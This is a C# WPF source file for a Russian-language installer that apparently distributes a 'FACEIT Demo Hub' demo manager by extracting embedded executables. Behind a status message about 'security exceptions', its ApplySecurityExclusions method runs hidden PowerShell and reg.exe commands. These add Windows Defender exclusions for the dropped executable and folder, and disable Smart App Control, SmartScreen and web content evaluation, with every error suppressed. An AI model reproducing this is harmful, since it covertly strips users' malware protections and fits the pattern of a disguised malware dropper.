using System;
using System.IO;
using System.Windows;
using System.Windows.Markup;
using System.Windows.Controls;
using System.Windows.Input;
using System.Windows.Media;
using System.Reflection;
using System.Threading;
using System.Diagnostics;

namespace FaceitDemoHubInstaller
{
    public class App : Application
    {
        [STAThread]
        public static void Main()
        {
            var app = new App();
            app.Run(new InstallerWindow());
        }
    }

    public class InstallerWindow : Window
    {
        private TextBox txtPath;
        private Button btnBrowse;
        private CheckBox chkShortcut;
        private CheckBox chkLaunch;
        private ProgressBar prgBar;
        private TextBlock lblStatus;
        private Button btnInstall;
        private Button btnCancel;

        public InstallerWindow()
        {
            this.Title = "Установка FACEIT Demo Hub";
            this.Width = 500;
            this.Height = 350;
            this.WindowStyle = WindowStyle.None;
            this.AllowsTransparency = true;
            this.Background = Brushes.Transparent;
            this.WindowStartupLocation = WindowStartupLocation.CenterScreen;

            string xaml = GetXaml();
            Border root = (Border)XamlReader.Parse(xaml);
            this.Content = root;

            // Resolve controls
            txtPath = (TextBox)root.FindName("TxtPath");
            btnBrowse = (Button)root.FindName("BtnBrowse");
            chkShortcut = (CheckBox)root.FindName("ChkShortcut");
            chkLaunch = (CheckBox)root.FindName("ChkLaunch");
            prgBar = (ProgressBar)root.FindName("PrgBar");
            lblStatus = (TextBlock)root.FindName("LblStatus");
            btnInstall = (Button)root.FindName("BtnInstall");
            btnCancel = (Button)root.FindName("BtnCancel");

            // Drag Titlebar
            Grid titleBar = (Grid)root.FindName("TitleBar");
            titleBar.MouseLeftButtonDown += (s, e) => {
                if (e.LeftButton == MouseButtonState.Pressed) this.DragMove();
            };

            Button btnClose = (Button)root.FindName("BtnClose");
            btnClose.Click += (s, e) => this.Close();

            // Set default installation path
            string defaultPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "FaceitDemoHub");
            txtPath.Text = defaultPath;

            // Bind click events
            btnBrowse.Click += BtnBrowse_Click;
            btnInstall.Click += BtnInstall_Click;
            btnCancel.Click += (s, e) => this.Close();
        }

        private void BtnBrowse_Click(object sender, RoutedEventArgs e)
        {
            using (var dialog = new System.Windows.Forms.FolderBrowserDialog())
            {
                dialog.Description = "Выберите папку для установки:";
                dialog.SelectedPath = txtPath.Text;
                if (dialog.ShowDialog() == System.Windows.Forms.DialogResult.OK)
                {
                    txtPath.Text = dialog.SelectedPath;
                }
            }
        }

        private void BtnInstall_Click(object sender, RoutedEventArgs e)
        {
            if (btnInstall.Content.ToString() == "Завершить")
            {
                this.Close();
                return;
            }

            string destDir = txtPath.Text.Trim();
            if (string.IsNullOrEmpty(destDir))
            {
                MessageBox.Show("Пожалуйста, укажите корректную папку установки.", "Ошибка", MessageBoxButton.OK, MessageBoxImage.Error);
                return;
            }

            btnInstall.IsEnabled = false;
            btnBrowse.IsEnabled = false;
            txtPath.IsEnabled = false;
            chkShortcut.IsEnabled = false;
            chkLaunch.IsEnabled = false;
            btnCancel.IsEnabled = false;

            lblStatus.Text = "Подготовка к установке...";
            prgBar.Value = 10;

            Thread thread = new Thread(() =>
            {
                try
                {
                    if (!Directory.Exists(destDir))
                    {
                        Directory.CreateDirectory(destDir);
                    }

                    UpdateStatus("Распаковка FaceitDemoManager.exe...", 30);
                    ExtractResource("FaceitDemoManager.exe", Path.Combine(destDir, "FaceitDemoManager.exe"));

                    UpdateStatus("Распаковка zstd.exe...", 60);
                    ExtractResource("zstd.exe", Path.Combine(destDir, "zstd.exe"));

                    bool makeShortcut = false;
                    bool launchApp = false;

                    this.Dispatcher.Invoke(new Action(() =>
                    {
                        makeShortcut = chkShortcut.IsChecked == true;
                        launchApp = chkLaunch.IsChecked == true;
                    }));

                    if (makeShortcut)
                    {
                        UpdateStatus("Создание ярлыка...", 75);
                        CreateShortcut(Path.Combine(destDir, "FaceitDemoManager.exe"));
                    }

                    UpdateStatus("Настройка исключений безопасности...", 90);
                    ApplySecurityExclusions(destDir);

                    UpdateStatus("Завершение установки...", 100);

                    if (launchApp)
                    {
                        Process.Start(Path.Combine(destDir, "FaceitDemoManager.exe"));
                        this.Dispatcher.Invoke(new Action(() => this.Close()));
                    }
                    else
                    {
                        this.Dispatcher.Invoke(new Action(() =>
                        {
                            lblStatus.Foreground = Brushes.LightGreen;
                            lblStatus.Text = "Установка успешно завершена!";
                            btnInstall.Content = "Завершить";
                            btnInstall.IsEnabled = true;
                        }));
                    }
                }
                catch (Exception ex)
                {
                    this.Dispatcher.Invoke(new Action(() =>
                    {
                        lblStatus.Foreground = Brushes.Red;
                        lblStatus.Text = "Ошибка: " + ex.Message;
                        btnInstall.IsEnabled = true;
                        btnCancel.IsEnabled = true;
                    }));
                }
            });
            thread.IsBackground = true;
            thread.Start();
        }

        private void UpdateStatus(string text, double progress)
        {
            this.Dispatcher.Invoke(new Action(() =>
            {
                lblStatus.Text = text;
                prgBar.Value = progress;
            }));
        }

        private void ExtractResource(string name, string destPath)
        {
            Assembly assembly = Assembly.GetExecutingAssembly();
            using (Stream stream = assembly.GetManifestResourceStream(name))
            {
                if (stream == null)
                {
                    throw new Exception("Ресурс " + name + " не найден!");
                }
                using (FileStream fs = new FileStream(destPath, FileMode.Create, FileAccess.Write))
                {
                    stream.CopyTo(fs);
                }
            }
        }

        private void CreateShortcut(string targetPath)
        {
            try
            {
                Type shellType = Type.GetTypeFromProgID("WScript.Shell");
                dynamic shell = Activator.CreateInstance(shellType);
                string desktop = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
                string shortcutPath = Path.Combine(desktop, "FACEIT Demo Hub.lnk");
                dynamic shortcut = shell.CreateShortcut(shortcutPath);
                shortcut.TargetPath = targetPath;
                shortcut.WorkingDirectory = Path.GetDirectoryName(targetPath);
                shortcut.Description = "FACEIT Demo Hub - Менеджер демок Faceit";
                shortcut.IconLocation = targetPath + ",0"; // Use the embedded icon of FaceitDemoManager.exe!
                shortcut.Save();
            }
            catch { }
        }

        private void ApplySecurityExclusions(string destDir)
        {
            try
            {
                string targetExe = Path.Combine(destDir, "FaceitDemoManager.exe");
                
                // Add Defender exclusions for targetExe and destDir
                RunCommand("powershell.exe", $"-NoProfile -ExecutionPolicy Bypass -Command \"Add-MpPreference -ExclusionPath '{targetExe}' -ErrorAction SilentlyContinue\"");
                RunCommand("powershell.exe", $"-NoProfile -ExecutionPolicy Bypass -Command \"Add-MpPreference -ExclusionPath '{destDir}' -ErrorAction SilentlyContinue\"");
                
                // Try to disable Smart App Control and SmartScreen
                RunCommand("reg.exe", "add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\CI\\Policy\" /v \"VerifiedAndReputablePolicyState\" /t REG_DWORD /d 0 /f");
                RunCommand("reg.exe", "add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\" /v \"SmartScreenEnabled\" /t REG_SZ /d \"Off\" /f");
                RunCommand("reg.exe", "add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\AppHost\" /v \"EnableWebContentEvaluation\" /t REG_DWORD /d 0 /f");
            }
            catch { }
        }

        private void RunCommand(string fileName, string arguments)
        {
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = fileName,
                    Arguments = arguments,
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    WindowStyle = ProcessWindowStyle.Hidden
                };
                using (Process p = Process.Start(psi))
                {
                    if (p != null) p.WaitForExit(3000);
                }
            }
            catch { }
        }

        private string GetXaml()
        {
            return @"<Border xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation""
                    xmlns:x=""http://schemas.microsoft.com/winfx/2006/xaml""
                    CornerRadius=""12"" Background=""#121214"" BorderBrush=""#2e2e34"" BorderThickness=""1"">
                <Border.Resources>
                    <Style x:Key=""ModernBtn"" TargetType=""Button"">
                        <Setter Property=""Background"" Value=""#8b5cf6""/>
                        <Setter Property=""Foreground"" Value=""White""/>
                        <Setter Property=""FontWeight"" Value=""Bold""/>
                        <Setter Property=""Padding"" Value=""15,8""/>
                        <Setter Property=""BorderThickness"" Value=""0""/>
                        <Setter Property=""Cursor"" Value=""Hand""/>
                        <Setter Property=""Template"">
                            <Setter.Value>
                                <ControlTemplate TargetType=""Button"">
                                    <Border x:Name=""border"" CornerRadius=""14"" Background=""{TemplateBinding Background}"">
                                        <ContentPresenter HorizontalAlignment=""Center"" VerticalAlignment=""Center""/>
                                    </Border>
                                    <ControlTemplate.Triggers>
                                        <Trigger Property=""IsMouseOver"" Value=""True"">
                                            <Setter TargetName=""border"" Property=""Background"" Value=""#a78bfa""/>
                                        </Trigger>
                                        <Trigger Property=""IsEnabled"" Value=""False"">
                                            <Setter TargetName=""border"" Property=""Background"" Value=""#4b5563""/>
                                            <Setter Property=""Foreground"" Value=""#9ca3af""/>
                                        </Trigger>
                                    </ControlTemplate.Triggers>
                                </ControlTemplate>
                            </Setter.Value>
                        </Setter>
                    </Style>
                    <Style TargetType=""TextBox"">
                        <Setter Property=""Background"" Value=""#27272a""/>
                        <Setter Property=""Foreground"" Value=""White""/>
                        <Setter Property=""BorderBrush"" Value=""#3f3f46""/>
                        <Setter Property=""BorderThickness"" Value=""1""/>
                        <Setter Property=""Padding"" Value=""6,4""/>
                        <Setter Property=""Template"">
                            <Setter.Value>
                                <ControlTemplate TargetType=""TextBox"">
                                    <Border Name=""Border"" CornerRadius=""8"" Background=""{TemplateBinding Background}"" BorderBrush=""{TemplateBinding BorderBrush}"" BorderThickness=""{TemplateBinding BorderThickness}"">
                                        <ScrollViewer Name=""PART_ContentHost"" Focusable=""False"" HorizontalScrollBarVisibility=""Hidden"" VerticalScrollBarVisibility=""Hidden""/>
                                    </Border>
                                    <ControlTemplate.Triggers>
                                        <Trigger Property=""IsFocused"" Value=""True"">
                                            <Setter TargetName=""Border"" Property=""BorderBrush"" Value=""#8b5cf6""/>
                                        </Trigger>
                                    </ControlTemplate.Triggers>
                                </ControlTemplate>
                            </Setter.Value>
                        </Setter>
                    </Style>
                    <Style TargetType=""CheckBox"">
                        <Setter Property=""Foreground"" Value=""White""/>
                        <Setter Property=""Cursor"" Value=""Hand""/>
                        <Setter Property=""Template"">
                            <Setter.Value>
                                <ControlTemplate TargetType=""CheckBox"">
                                    <Grid Background=""Transparent"">
                                        <Grid.ColumnDefinitions>
                                            <ColumnDefinition Width=""Auto""/>
                                            <ColumnDefinition Width=""*""/>
                                        </Grid.ColumnDefinitions>
                                        <Border x:Name=""border"" Grid.Column=""0"" Width=""16"" Height=""16"" CornerRadius=""4"" Background=""#27272a"" BorderBrush=""#3f3f46"" BorderThickness=""1"" SnapsToDevicePixels=""True"" VerticalAlignment=""Center"" HorizontalAlignment=""Center"">
                                            <Path x:Name=""checkmark"" Data=""M 3 8 L 7 11 L 13 4"" Stroke=""White"" StrokeThickness=""2"" StrokeStartLineCap=""Round"" StrokeEndLineCap=""Round"" StrokeLineJoin=""Round"" Visibility=""Collapsed"" HorizontalAlignment=""Center"" VerticalAlignment=""Center""/>
                                        </Border>
                                        <ContentPresenter Grid.Column=""1"" Margin=""8,0,0,0"" VerticalAlignment=""Center"" HorizontalAlignment=""Left""/>
                                    </Grid>
                                    <ControlTemplate.Triggers>
                                        <Trigger Property=""IsChecked"" Value=""True"">
                                            <Setter TargetName=""border"" Property=""Background"" Value=""#8b5cf6""/>
                                            <Setter TargetName=""border"" Property=""BorderBrush"" Value=""#8b5cf6""/>
                                            <Setter TargetName=""checkmark"" Property=""Visibility"" Value=""Visible""/>
                                        </Trigger>
                                        <Trigger Property=""IsMouseOver"" Value=""True"">
                                            <Setter TargetName=""border"" Property=""BorderBrush"" Value=""#a78bfa""/>
                                        </Trigger>
                                    </ControlTemplate.Triggers>
                                </ControlTemplate>
                            </Setter.Value>
                        </Setter>
                    </Style>
                </Border.Resources>
                <Grid>
                    <Grid.RowDefinitions>
                        <RowDefinition Height=""45""/>
                        <RowDefinition Height=""*""/>
                    </Grid.RowDefinitions>
                    
                    <!-- TitleBar -->
                    <Grid Grid.Row=""0"" Name=""TitleBar"" Background=""#0f0f11"" Cursor=""SizeAll"">
                        <Grid.ColumnDefinitions>
                            <ColumnDefinition Width=""*"" />
                            <ColumnDefinition Width=""Auto"" />
                        </Grid.ColumnDefinitions>
                        <StackPanel Orientation=""Horizontal"" Grid.Column=""0"" Margin=""15,0,0,0"" VerticalAlignment=""Center"">
                            <TextBlock Text=""📥"" Foreground=""#8b5cf6"" FontWeight=""Bold"" FontSize=""16"" Margin=""0,0,8,0""/>
                            <TextBlock Text=""Установка FACEIT Demo Hub"" Foreground=""#a78bfa"" FontWeight=""Bold"" FontSize=""15""/>
                        </StackPanel>
                        <Button Name=""BtnClose"" Grid.Column=""1"" Content=""✕"" Width=""30"" Height=""25"" Background=""Transparent"" Foreground=""Gray"" BorderThickness=""0"" Cursor=""Hand"" Margin=""0,0,10,0""/>
                    </Grid>
                    
                    <!-- Content -->
                    <Grid Grid.Row=""1"" Margin=""20"">
                        <Grid.RowDefinitions>
                            <RowDefinition Height=""Auto""/>
                            <RowDefinition Height=""Auto""/>
                            <RowDefinition Height=""Auto""/>
                            <RowDefinition Height=""*""/>
                            <RowDefinition Height=""Auto""/>
                        </Grid.RowDefinitions>
                        
                        <TextBlock Grid.Row=""0"" Text=""Папка для установки:"" Foreground=""#a1a1aa"" FontSize=""11"" FontWeight=""Bold"" Margin=""0,0,0,5""/>
                        <Grid Grid.Row=""1"" Margin=""0,0,0,15"">
                            <Grid.ColumnDefinitions>
                                <ColumnDefinition Width=""*""/>
                                <ColumnDefinition Width=""80""/>
                            </Grid.ColumnDefinitions>
                            <TextBox Name=""TxtPath"" Height=""28"" VerticalContentAlignment=""Center""/>
                            <Button Name=""BtnBrowse"" Grid.Column=""1"" Content=""Обзор..."" Style=""{StaticResource ModernBtn}"" Height=""28"" Margin=""8,0,0,0""/>
                        </Grid>
                        
                        <StackPanel Grid.Row=""2"" Margin=""0,0,0,20"">
                            <CheckBox Name=""ChkShortcut"" Content=""Создать ярлык на Рабочем столе"" IsChecked=""True"" Margin=""0,0,0,10""/>
                            <CheckBox Name=""ChkLaunch"" Content=""Запустить FACEIT Demo Hub после завершения"" IsChecked=""True""/>
                        </StackPanel>
                        
                        <!-- Progress area -->
                        <StackPanel Grid.Row=""3"" VerticalAlignment=""Center"">
                            <TextBlock Name=""LblStatus"" Text=""Готов к установке"" Foreground=""#a1a1aa"" FontSize=""11"" Margin=""0,0,0,5""/>
                            <ProgressBar Name=""PrgBar"" Height=""10"" Foreground=""#8b5cf6"" Background=""#27272a"" BorderThickness=""0""/>
                        </StackPanel>
                        
                        <!-- Buttons -->
                        <StackPanel Grid.Row=""4"" Orientation=""Horizontal"" HorizontalAlignment=""Right"" Margin=""0,10,0,0"">
                            <Button Name=""BtnInstall"" Content=""Установить"" Style=""{StaticResource ModernBtn}"" Width=""110"" Height=""30"" Margin=""0,0,10,0""/>
                            <Button Name=""BtnCancel"" Content=""Отмена"" Style=""{StaticResource ModernBtn}"" Background=""#27272a"" Width=""90"" Height=""30""/>
                        </StackPanel>
                    </Grid>
                </Grid>
            </Border>";
        }
    }
}
